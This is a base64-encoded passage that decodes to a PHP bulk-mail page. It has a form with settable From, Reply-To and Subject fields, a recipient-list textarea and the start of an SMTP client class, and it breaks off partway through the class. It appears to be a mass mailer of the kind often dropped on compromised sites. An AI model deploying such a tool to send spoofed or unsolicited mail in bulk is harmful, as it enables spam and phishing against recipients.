ZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0iZnJvbSIgdmFsdWU9Ijw/PSRmcm9tOz8+IiBzaXplPSIzMCI+CgogICAgICAgIDwvZm9udD48L3RkPgoKICAgICAgPHRkIHdpZHRoPSIzMSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgPGRpdiBhbGlnbj0icmlnaHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj5Zb3VyCgogICAgICAgICAgTmFtZTo8L2ZvbnQ+PC9kaXY+CgogICAgICA8L3RkPgoKICAgICAgPHRkIHdpZHRoPSI0MSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCAjMDFBOURCO2NvbG9yOiMzMzMiIG5hbWU9InJlYWxuYW1lIiB2YWx1ZT0iPD89JHJlYWxuYW1lX2Jhc2U7Pz4iIHNpemU9IjMwIj4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgPC90cj4KICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgIDxkaXYgYWxpZ249InJpZ2h0Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+UmVwbHktVG86PC9mb250PjwvZGl2PgoKICAgICAgPC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iMTglIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODs7Ym9yZGVyOiAxcHggc29saWQgIzAxQTlEQjtjb2xvcjojMzMzIiBuYW1lPSJyZXBseXRvIiB2YWx1ZT0iPD89JHJlcGx5dG87Pz4iIHNpemU9IjMwIj4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgICA8dGQgd2lkdGg9IjMxJSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKICAgICAgICA8cCBhbGlnbj0icmlnaHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KICAgICAgICBFbWFpbCBQcmlvcml0eTo8L2ZvbnQ+PC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iNDElIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKICAgICAgICAmbmJzcDs8L2ZvbnQ+PHNlbGVjdCBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCAjMDFBOURCO2NvbG9yOiMzMzMiIG5hbWU9ImVwcmlvcml0eSIgaWQ9Imxpc3RNZXRob2QiIG9uY2hhbmdlPSJzaG93SGlkZUxpc3RDb25maWcoKSI+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iIiA8PyBpZihzdHJsZW4oJGVwcmlvcml0eSk8IDEpe3ByaW50ICJzZWxlY3RlZCI7fSA/PiA+LSBQbGVhc2UgQ2hvb3NlIC08L29wdGlvbj4KICAgICAgICA8b3B0aW9uIHZhbHVlPSIxIiA8PyBpZigkZXByaW9yaXR5ID09ICIxIil7cHJpbnQgInNlbGVjdGVkIjt9ID8+ID5IaWdoPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiB2YWx1ZT0iMyIgPD8gaWYoJGVwcmlvcml0eSA9PSAiMyIpe3ByaW50ICJzZWxlY3RlZCI7fSA/PiA+Tm9ybWFsPC9vcHRpb24+CgkJPG9wdGlvbiB2YWx1ZT0iNSIgPD8gaWYoJGVwcmlvcml0eSA9PSAiNSIpe3ByaW50ICJzZWxlY3RlZCI7fSA/PiA+TG93PC9vcHRpb24+CgkJPC9zZWxlY3Q+PC90ZD4KCiAgICA8L3RyPgoKICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgIDxkaXYgYWxpZ249InJpZ2h0Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+U3ViamVjdDo8L2ZvbnQ+PC9kaXY+CgogICAgICA8L3RkPgoKICAgICAgPHRkIGNvbHNwYW49IjMiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzdWJqZWN0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCAjMDFBOURCO2NvbG9yOiMzMzMiIHZhbHVlPSI8Pz0kc3ViamVjdF9iYXNlOz8+IiBzaXplPSI5MCI+CgogICAgICAgIDwvZm9udD48L3RkPgoKICAgIDwvdHI+CgogICAgPHRyPgoKICAgICAgPHRkIHdpZHRoPSIxMCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgJm5ic3A7PC90ZD4KCiAgICAgIDx0ZCBjb2xzcGFuPSIzIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKICAgICAgICAmbmJzcDsgPGZvbnQgY29sb3I9IiNGRjAwMDAiPkVuY29kZSBzZW5kaW5nIGluZm9ybWF0aW9uID88L2ZvbnQ+IDxzZWxlY3Qgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODs7Ym9yZGVyOiAxcHggc29saWQgIzAxQTlEQjtjb2xvcjojMzMzIiBzaXplPSIxIiBuYW1lPSJlbmNvZGUiPgogICAgICAgIDxvcHRpb24gPD8gaWYoJGVuY29kZV90ZXh0ID09ICJ5ZXMiKXtwcmludCAic2VsZWN0ZWQiO30gPz4+eWVzPC9vcHRpb24+CiAgICAgICAgPG9wdGlvbiA8PyBpZigkZW5jb2RlX3RleHQgPT0gIm5vIil7cHJpbnQgInNlbGVjdGVkIjt9ID8+Pm5vPC9vcHRpb24+CiAgICAgICAgPC9zZWxlY3Q+PC9mb250PjwvdGQ+CgogICAgPC90cj4KCiAgICA8dHIgdmFsaWduPSJ0b3AiPgoKPHRkIGNvbHNwYW49IjMiIGhlaWdodD0iMTkwIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTEiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPiAKCiAgICAgICAgPHRleHRhcmVhIG5hbWU9Im1lc3NhZ2UiIGNvbHM9IjYwIiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCAjMDFBOURCO2NvbG9yOiMzMzMiIHJvd3M9IjEwIj48Pz0kbWVzc2FnZTs/PjwvdGV4dGFyZWE+CgogICAgICAgIDxicj4KCiAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJjb250ZW50dHlwZSIgdmFsdWU9InBsYWluIiA+CgogICAgICAgIFBsYWluIAoKICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImNvbnRlbnR0eXBlIiB2YWx1ZT0iaHRtbCIgY2hlY2tlZD4KCiAgICAgICAgSFRNTCAKCiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0ic2VuZCI+CgkJPGlucHV0IGNsYXNzPSJ1aWJ1dHRvbiIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2VuZCBNZXNzYWdlIj4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgICA8dGQgd2lkdGg9IjQxJSIgaGVpZ2h0PSIxOTAiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJlbWFpbGxpc3QiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgY29scz0iMzAiIHJvd3M9IjEwIj48Pz0kZW1haWxsaXN0Oz8+PC90ZXh0YXJlYT4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgPC90cj4KCiAgPC90YWJsZT4KCjwvZm9ybT4KCgoKPD8KCmlmICgkYWN0aW9uKXsKICAgICAgICBpZiAoISRmcm9tICYmICEkc3ViamVjdCAmJiAhJG1lc3NhZ2UgJiYgISRlbWFpbGxpc3QpewogICAgICAgIHByaW50ICI8c2NyaXB0PmFsZXJ0KCdQbGVhc2UgY29tcGxldGUgYWxsIGZpZWxkcyBiZWZvcmUgc2VuZGluZyB5b3VyIG1lc3NhZ2UuJyk7IDwvc2NyaXB0PiI7CiAgICAgICAgZGllKCk7CX0KCmNsYXNzIFNNVFAKewogIC8qKgogICAqICBTTVRQIHNlcnZlciBwb3J0CiAgICogIEB2YXIgaW50CiAgICovCiAgdmFyICRTTVRQX1BPUlQgPSAyNTsKCiAgLyoqCiAgICogIFNNVFAgcmVwbHkgbGluZSBlbmRpbmcKICAgKiAgQHZhciBzdHJpbmcKICAgKi8KICB2YXIgJENSTEYgPSAiXHJcbiI7CgogIC8qKgogICAqICBTZXRzIHdoZXRoZXIgZGVidWdnaW5nIGlzIHR1cm5lZCBvbgogICAqICBAdmFyIGJvb2wKICAgKi8KICB2YXIgJGRvX2RlYnVnOyAgICAgICAjIHRoZSBsZXZlbCBvZiBkZWJ1ZyB0byBwZXJmb3JtCgogIC8qKgogICAqICBTZXRzIFZFUlAgdXNlIG9uL29mZiAoZGVmYXVsdCBpcyBvZmYpCiAgICogIEB2YXIgYm9vbAogICAqLwogIHZhciAkZG9fdmVycCA9IGZhbHNlOwoKICAvKiojQCsKICAgKiBAYWNjZXNzIHByaXZhdGUKICAgKi8KICB2YXIgJHNtdHBfY29ubjsgICAgICAjIHRoZSBzb2NrZXQgdG8gdGhlIHNlcnZlcgogIHZhciAkZXJyb3I7ICAgICAgICAgICMgZXJyb3IgaWYgYW55IG9uIHRoZSBsYXN0IGNhbGwKICB2YXIgJGhlbG9fcnBseTsgICAgICAjIHRoZSByZXBseSB0aGUgc2VydmVyIHNlbnQgdG8gdXMgZm9yIEhFTE8KICAvKiojQC0qLwoKICAvKioKICAgKiBJbml0aWFsaXplIHRoZSBjbGFzcyBzbyB0aGF0IHRoZSBkYXRhIGlzIGluIGEga25vd24gc3RhdGUuCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIHZvaWQKICAgKi8KICBmdW5jdGlvbiBTTVRQKCkgewogICAgJHRoaXMtPnNtdHBfY29ubiA9IDA7CiAgICAkdGhpcy0+ZXJyb3IgPSBudWxsOwogICAgJHRoaXMtPmhlbG9fcnBseSA9IG51bGw7CgogICAgJHRoaXMtPmRvX2RlYnVnID0gMDsKICB9CgogIC8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiAgICogICAgICAgICAgICAgICAgICAgIENPTk5FQ1RJT04gRlVOQ1RJT05TICAgICAgICAgICAgICAgICAgKgogICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCiAgLyoqCiAgICogQ29ubmVjdCB0byB0aGUgc2VydmVyIHNwZWNpZmllZCBvbiB0aGUgcG9ydCBzcGVjaWZpZWQuCiAgICogSWYgdGhlIHBvcnQgaXMgbm90IHNwZWNpZmllZCB1c2UgdGhlIGRlZmF1bHQgU01UUF9QT1JULgogICAqIElmIHR2YWwgaXMgc3BlY2lmaWVkIHRoZW4gYSBjb25uZWN0aW9uIHdpbGwgdHJ5IGFuZCBiZQogICAqIGVzdGFibGlzaGVkIHdpdGggdGhlIHNlcnZlciBmb3IgdGhhdCBudW1iZXIgb2Ygc2Vjb25kcy4KICAgKiBJZiB0dmFsIGlzIG5vdCBzcGVjaWZpZWQgdGhlIGRlZmF1bHQgaXMgMzAgc2Vjb25kcyB0bwogICAqIHRyeSBvbiB0aGUgY29ubmVjdGlvbi4KICAgKgogICAqIFNNVFAgQ09ERSBTVUNDRVNTOiAyMjAKICAgKiBTTVRQIENPREUgRkFJTFVSRTogNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBDb25uZWN0KCRob3N0LCRwb3J0PTAsJHR2YWw9MzApIHsKICAgICMgc2V0IHRoZSBlcnJvciB2YWwgdG8gbnVsbCBzbyB0aGVyZSBpcyBubyBjb25mdXNpb24KICAgICR0aGlzLT5lcnJvciA9IG51bGw7CgogICAgIyBtYWtlIHN1cmUgd2UgYXJlIF9fbm90X18gY29ubmVjdGVkCiAgICBpZigkdGhpcy0+Y29ubmVjdGVkKCkpIHsKICAgICAgIyBvayB3ZSBhcmUgY29ubmVjdGVkISB3aGF0IHNob3VsZCB3ZSBkbz8KICAgICAgIyBmb3Igbm93IHdlIHdpbGwganVzdCBnaXZlIGFuIGVycm9yIHNheWluZyB3ZQogICAgICAjIGFyZSBhbHJlYWR5IGNvbm5lY3RlZAogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgiZXJyb3IiID0+ICJBbHJlYWR5IGNvbm5lY3RlZCB0byBhIHNlcnZlciIpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgaWYoZW1wdHkoJHBvcnQpKSB7CiAgICAgICRwb3J0ID0gJHRoaXMtPlNNVFBfUE9SVDsKICAgIH0KCiAgICAjY29ubmVjdCB0byB0aGUgc210cCBzZXJ2ZXIKICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBmc29ja29wZW4oJGhvc3QsICAgICMgdGhlIGhvc3Qgb2YgdGhlIHNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcG9ydCwgICAgIyB0aGUgcG9ydCB0byB1c2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGVycm5vLCAgICMgZXJyb3IgbnVtYmVyIGlmIGFueQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZXJyc3RyLCAgIyBlcnJvciBtZXNzYWdlIGlmIGFueQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdHZhbCk7ICAgIyBnaXZlIHVwIGFmdGVyID8gc2VjcwogICAgIyB2ZXJpZnkgd2UgY29ubmVjdGVkIHByb3Blcmx5CiAgICBpZihlbXB0eSgkdGhpcy0+c210cF9jb25uKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgiZXJyb3IiID0+ICJGYWlsZWQgdG8gY29ubmVjdCB0byBzZXJ2ZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAiZXJybm8iID0+ICRlcnJubywKICAgICAgICAgICAgICAgICAgICAgICAgICAgImVycnN0ciIgPT4gJGVycnN0cik7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCiAgICAgICAgICAgICAgICAgIjogJGVycnN0ciAoJGVycm5vKSIgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgIyBzb21ldGltZXMgdGhlIFNNVFAgc2VydmVyIHRha2VzIGEgbGl0dGxlIGxvbmdlciB0byByZXNwb25kCiAgICAjIHNvIHdlIHdpbGwgZ2l2ZSBpdCBhIGxvbmdlciB0aW1lb3V0IGZvciB0aGUgZmlyc3QgcmVhZAogICAgLy8gV2luZG93cyBzdGlsbCBkb2VzIG5vdCBoYXZlIHN1cHBvcnQgZm9yIHRoaXMgdGltZW91dCBmdW5jdGlvbgogICAgaWYoc3Vic3RyKFBIUF9PUywgMCwgMykgIT0gIldJTiIpCiAgICAgc29ja2V0X3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sICR0dmFsLCAwKTsKCiAgICAjIGdldCBhbnkgYW5ub3VuY2VtZW50IHN0dWZmCiAgICAkYW5ub3VuY2UgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgogICAgIyBzZXQgdGhlIHRpbWVvdXQgIG9mIGFueSBzb2NrZXQgZnVuY3Rpb25zIGF0IDEvMTAgb2YgYSBzZWNvbmQKICAgIC8vaWYoZnVuY3Rpb25fZXhpc3RzKCJzb2NrZXRfc2V0X3RpbWVvdXQiKSkKICAgIC8vICAgc29ja2V0X3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sIDAsIDEwMDAwMCk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkYW5ub3VuY2U7CiAgICB9CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBQZXJmb3JtcyBTTVRQIGF1dGhlbnRpY2F0aW9uLiAgTXVzdCBiZSBydW4gYWZ0ZXIgcnVubmluZyB0aGUKICAgKiBIZWxsbygpIG1ldGhvZC4gIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsbHkgYXV0aGVudGljYXRlZC4KICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIEF1dGhlbnRpY2F0ZSgkdXNlcm5hbWUsICRwYXNzd29yZCkgewogICAgLy8gU3RhcnQgYXV0aGVudGljYXRpb24KICAgIGZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sIkFVVEggTE9HSU4iIC4gJHRoaXMtPkNSTEYpOwoKICAgICRycGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJGNvZGUgPSBzdWJzdHIoJHJwbHksMCwzKTsKCiAgICBpZigkY29kZSAhPSAzMzQpIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJBVVRIIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCiAgICAgICAgICAgICAgInNtdHBfY29kZSIgPT4gJGNvZGUsCiAgICAgICAgICAgICAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHJwbHksNCkpOwogICAgICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewogICAgICAgIGVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVycm9yIl0gLgogICAgICAgICAgICAgICAgICI6ICIgLiAkcnBseSAuICR0aGlzLT5DUkxGOwogICAgICB9CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvLyBTZW5kIGVuY29kZWQgdXNlcm5hbWUKICAgIGZwdXRzKCR0aGlzLT5zbXRwX2Nvbm4sIGJhc2U2NF9lbmNvZGUoJHVzZXJuYW1lKSAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJGNvZGUgIT0gMzM0KSB7CiAgICAgICR0aGlzLT5lcnJvciA9CiAgICAgICAgYXJyYXkoImVycm9yIiA9PiAiVXNlcm5hbWUgbm90IGFjY2VwdGVkIGZyb20gc2VydmVyIiwKICAgICAgICAgICAgICAic210cF9jb2RlIiA9PiAkY29kZSwKICAgICAgICAgICAgICAic210cF9tc2ciID0+IHN1YnN0cigkcnBseSw0KSk7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCiAgICAgICAgICAgICAgICAgIjogIiAuICRycGx5IC4gJHRoaXMtPkNSTEY7CiAgICAgIH0KICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8vIFNlbmQgZW5jb2RlZCBwYXNzd29yZAogICAgZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwgYmFzZTY0X2VuY29kZSgkcGFzc3dvcmQpIC4gJHRoaXMtPkNSTEYpOwoKICAgICRycGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJGNvZGUgPSBzdWJzdHIoJHJwbHksMCwzKTsKCiAgICBpZigkY29kZSAhPSAyMzUpIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJQYXNzd29yZCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2ZXIiLAogICAgICAgICAgICAgICJzbXRwX2NvZGUiID0+ICRjb2RlLAogICAgICAgICAgICAgICJzbXRwX21zZyIgPT4gc3Vic3RyKCRycGx5LDQpKTsKICAgICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKICAgICAgICBlY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KICAgICAgICAgICAgICAgICAiOiAiIC4gJHJwbHkgLiAkdGhpcy0+Q1JMRjsKICAgICAgfQogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgcmV0dXJuIHRydWU7CiAgfQoKICAvKioKICAgKiBSZXR1cm5zIHRydWUgaWYgY29ubmVjdGVkIHRvIGEgc2VydmVyIG90aGVyd2lzZSBmYWxzZQogICAqIEBhY2Nlc3MgcHJpdmF0ZQogICAqIEByZXR1cm4gYm9vbAogICAqLwogIGZ1bmN0aW9uIENvbm5lY3RlZCgpIHsKICAgIGlmKCFlbXB0eSgkdGhpcy0+c210cF9jb25uKSkgewogICAgICAkc29ja19zdGF0dXMgPSBzb2NrZXRfZ2V0X3N0YXR1cygkdGhpcy0+c210cF9jb25uKTsKICAgICAgaWYoJHNvY2tfc3RhdHVzWyJlb2YiXSkgewogICAgICAgICMgaG1tIHRoaXMgaXMgYW4gb2RkIHNpdHVhdGlvbi4uLiB0aGUgc29ja2V0IGlzCiAgICAgICAgIyB2YWxpZCBidXQgd2UgYXJlIG5vdCBjb25uZWN0ZWQgYW55bW9yZQogICAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgICAgIGVjaG8gIlNNVFAgLT4gTk9USUNFOiIgLiAkdGhpcy0+Q1JMRiAuCiAgICAgICAgICAgICAgICAgIkVPRiBjYXVnaHQgd2hpbGUgY2hlY2tpbmcgaWYgY29ubmVjdGVkIjsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPkNsb3NlKCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIHJldHVybiB0cnVlOyAjIGV2ZXJ5dGhpbmcgbG9va3MgZ29vZAogICAgfQogICAgcmV0dXJuIGZhbHNlOwogIH0KCiAgLyoqCiAgICogQ2xvc2VzIHRoZSBzb2NrZXQgYW5kIGNsZWFucyB1cCB0aGUgc3RhdGUgb2YgdGhlIGNsYXNzLgogICAqIEl0IGlzIG5vdCBjb25zaWRlcmVkIGdvb2QgdG8gdXNlIHRoaXMgZnVuY3Rpb24gd2l0aG91dAogICAqIGZpcnN0IHRyeWluZyB0byB1c2UgUVVJVC4KICAgKiBAYWNjZXNzIHB1YmxpYwogICAqIEByZXR1cm4gdm9pZAogICAqLwogIGZ1bmN0aW9uIENsb3NlKCkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyB0aGVyZSBpcyBubyBjb25mdXNpb24KICAgICR0aGlzLT5oZWxvX3JwbHkgPSBudWxsOwogICAgaWYoIWVtcHR5KCR0aGlzLT5zbXRwX2Nvbm4pKSB7CiAgICAgICMgY2xvc2UgdGhlIGNvbm5lY3Rpb24gYW5kIGNsZWFudXAKICAgICAgZmNsb3NlKCR0aGlzLT5zbXRwX2Nvbm4pOwogICAgICAkdGhpcy0+c210cF9jb25uID0gMDsKICAgIH0KICB9CgogIC8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKICAgKiAgICAgICAgICAgICAgICAgICAgICAgIFNNVFAgQ09NTUFORFMgICAgICAgICAgICAgICAgICAgICAgICoKICAgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCiAgLyoqCiAgICogSXNzdWVzIGEgZGF0YSBjb21tYW5kIGFuZCBzZW5kcyB0aGUgbXNnX2RhdGEgdG8gdGhlIHNlcnZlcgogICAqIGZpbmlhbGl6aW5nIHRoZSBtYWlsIHRyYW5zYWN0aW9uLiAkbXNnX2RhdGEgaXMgdGhlIG1lc3NhZ2UKICAgKiB0aGF0IGlzIHRvIGJlIHNlbmQgd2l0aCB0aGUgaGVhZGVycy4gRWFjaCBoZWFkZXIgbmVlZHMgdG8gYmUKICAgKiBvbiBhIHNpbmdsZSBsaW5lIGZvbGxvd2VkIGJ5IGEgPENSTEY+IHdpdGggdGhlIG1lc3NhZ2UgaGVhZGVycwogICAqIGFuZCB0aGUgbWVzc2FnZSBib2R5IGJlaW5nIHNlcGVyYXRlZCBieSBhbmQgYWRkaXRpb25hbCA8Q1JMRj4uCiAgICoKICAgKiBJbXBsZW1lbnRzIHJmYyA4MjE6IERBVEEgPENSTEY+CiAgICoKICAgKiBTTVRQIENPREUgSU5URVJNRURJQVRFOiAzNTQKICAgKiAgICAgW2RhdGFdCiAgICogICAgIDxDUkxGPi48Q1JMRj4KICAgKiAgICAgU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAogICAqICAgICBTTVRQIENPREUgRkFJTFVSRTogNTUyLDU1NCw0NTEsNDUyCiAgICogU01UUCBDT0RFIEZBSUxVUkU6IDQ1MSw1NTQKICAgKiBTTVRQIENPREUgRVJST1IgIDogNTAwLDUwMSw1MDMsNDIxCiAgICogQGFjY2VzcyBwdWJsaWMKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBmdW5jdGlvbiBEYXRhKCRtc2dfZGF0YSkgewogICAgJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgogICAgaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewogICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKICAgICAgICAgICAgICAiZXJyb3IiID0+ICJDYWxsZWQgRGF0YSgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmcHV0cygkdGhpcy0+c210cF9jb25uLCJEQVRBIiAuICR0aGlzLT5DUkxGKTsKCiAgICAkcnBseSA9ICR0aGlzLT5nZXRfbGluZXMoKTsKICAgICRjb2RlID0gc3Vic3RyKCRycGx5LDAsMyk7CgogICAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKICAgICAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkcnBseTsKICAgIH0KCiAgICBpZigkY29kZSAhPSAzNTQpIHsKICAgICAgJHRoaXMtPmVycm9yID0KICAgICAgICBhcnJheSgiZXJyb3IiID0+ICJEQVRBIGNvbW1hbmQgbm90IGFjY2VwdGVkIGZyb20gc2VydmVyIiwKICAgICAgICAgICAgICAic210cF9jb2RlIiA9PiAkY29kZSwKICAgICAgICAgICAgICAic210cF9tc2ciID0+IHN1YnN0cigkcnBseSw0KSk7CiAgICAgIGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CiAgICAgICAgZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCiAgICAgICAgICAgICAgICAgIjogIiAuICRycGx5IC4gJHRoaXMtPkNSTEY7CiAgICAgIH0K